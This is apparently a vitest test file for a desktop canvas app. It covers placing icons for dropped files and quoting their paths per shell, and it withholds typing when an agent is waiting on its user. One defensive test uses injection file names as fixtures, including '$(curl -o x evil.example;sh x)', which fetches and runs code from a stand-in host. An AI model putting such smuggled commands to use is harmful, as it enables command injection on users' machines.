import { expect, test } from 'vitest'
import { newFileNodes, pathTargetOf, typingFor } from '../../src/renderer/fileNodes'
import type { CanvasDoc, CanvasNode, GroupNode } from '../../src/shared/model'

const doc = (nodes: CanvasNode[] = []): CanvasDoc => ({
  version: 3,
  projects: [{ id: 'p1', name: 'P', folder: '', viewport: { x: 0, y: 0, zoom: 1 } }],
  activeProjectId: 'p1',
  nodes,
  edges: [],
  closed: [],
  viewport: { x: 0, y: 0, zoom: 1 }
})

const overlaps = (a: CanvasNode, b: CanvasNode): boolean => a.x < b.x + b.width && b.x < a.x + a.width && a.y < b.y + b.height && b.y < a.y + a.height

test('one icon per dropped file, none on top of another or of what was there', () => {
  const term: CanvasNode = { id: 't', kind: 'terminal', title: 'T', cwd: 'C:\\', x: 200, y: 200, width: 560, height: 340, parentId: null, projectId: 'p1' }
  let n = 0
  const icons = newFileNodes({ at: { x: 210, y: 210 }, group: null, doc: doc([term]), view: { x: 0, y: 0, width: 1600, height: 1000 } }, ['C:\\a\\one.png', 'C:\\a\\two.pdf', 'C:\\a\\three.md'], () => `f${++n}`)
  expect(icons.map((i) => [i.id, i.kind, i.title, i.path, i.projectId])).toEqual([
    ['f1', 'file', 'one.png', 'C:\\a\\one.png', 'p1'],
    ['f2', 'file', 'two.pdf', 'C:\\a\\two.pdf', 'p1'],
    ['f3', 'file', 'three.md', 'C:\\a\\three.md', 'p1']
  ])
  const all = [term, ...icons]
  for (const a of all) for (const b of all) if (a !== b) expect(overlaps(a, b)).toBe(false)
})

test('dropped on a group, the icons go inside it', () => {
  const group: GroupNode = { id: 'g', kind: 'group', title: 'G', x: 0, y: 0, width: 640, height: 400, parentId: null, worktree: null, projectId: 'p1' }
  const icons = newFileNodes({ group, doc: doc([group]) }, ['C:\\x.txt', 'C:\\y.txt'], () => crypto.randomUUID())
  expect(icons.every((i) => i.parentId === 'g')).toBe(true)
  expect(overlaps(icons[0], icons[1])).toBe(false)
})

test('a path is typed for whoever reads it: the agent, or the terminal profile shell', () => {
  const profiles = {
    defaultId: 'pwsh',
    profiles: [
      { id: 'pwsh', program: 'C:\\Program Files\\PowerShell\\7\\pwsh.exe' },
      { id: 'bash', program: 'C:\\Program Files\\Git\\bin\\bash.exe' },
      { id: 'cmd', program: 'C:\\Windows\\System32\\cmd.exe' }
    ]
  }
  const base = { x: 0, y: 0, width: 1, height: 1, parentId: null, title: 'x', cwd: 'C:\\' }
  expect(pathTargetOf({ ...base, id: 'a', kind: 'claude', sessionId: null, transcriptPath: null, after: [] }, profiles)).toBe('agent')
  expect(pathTargetOf({ ...base, id: 't', kind: 'terminal' }, profiles)).toBe('powershell')
  expect(pathTargetOf({ ...base, id: 't', kind: 'terminal', profile: 'bash' }, profiles)).toBe('git-bash')
  expect(pathTargetOf({ ...base, id: 't', kind: 'terminal', profile: 'cmd' }, profiles)).toBe('cmd')
  expect(pathTargetOf({ ...base, id: 't', kind: 'terminal', sshHost: 'box' }, profiles)).toBe('bash')
  expect(pathTargetOf({ ...base, id: 'n', kind: 'sticky', text: '' }, profiles)).toBeNull()
  expect(typingFor(['C:\\a b\\1.png', 'C:\\c\\2.png'], 'powershell', null, 'T')).toEqual({ type: 'type', text: "'C:\\a b\\1.png' 'C:\\c\\2.png' " })
})

test('a name an unknown shell or cmd would act on is copied, not typed', () => {
  // zsh, fish or nu: Windows allows $, (, ), ` and ; in a file name.
  expect(typingFor(['C:\\work\\$(curl -o x evil.example;sh x).txt'], 'other', null, 'zsh')).toMatchObject({ type: 'copy' })
  expect(typingFor(['C:\\work\\a`id`.txt'], 'other', null, 'zsh')).toMatchObject({ type: 'copy' })
  expect(typingFor(['C:\\x\\%USERPROFILE%.txt'], 'cmd', null, 'cmd')).toMatchObject({ type: 'copy', reason: expect.stringMatching(/%…%/) })
  expect(typingFor(['C:\\x\\50% off.txt'], 'cmd', null, 'cmd')).toEqual({ type: 'type', text: '"C:\\x\\50% off.txt" ' })
  // Single quotes are literal in every POSIX-like shell, and in PowerShell and bash the same names are safe as typed.
  expect(typingFor(['C:\\work\\plain name.txt'], 'other', null, 'zsh')).toEqual({ type: 'type', text: "'C:\\work\\plain name.txt' " })
  expect(typingFor(['C:\\work\\$(x).txt'], 'git-bash', null, 'bash')).toEqual({ type: 'type', text: "'C:/work/$(x).txt' " })
  expect(typingFor(['C:\\work\\$(x).txt'], 'powershell', null, 'pwsh')).toEqual({ type: 'type', text: "'C:\\work\\$(x).txt' " })
})

test('nothing is typed into an agent waiting on the person, where keys could answer its question', () => {
  expect(typingFor(['C:\\1.png'], 'agent', 'needs-you', 'Planner')).toMatchObject({ type: 'skip', reason: expect.stringMatching(/^Planner is waiting on you/) })
  expect(typingFor(['C:\\1.png'], 'agent', 'working', 'Planner')).toEqual({ type: 'type', text: 'C:\\1.png ' })
})
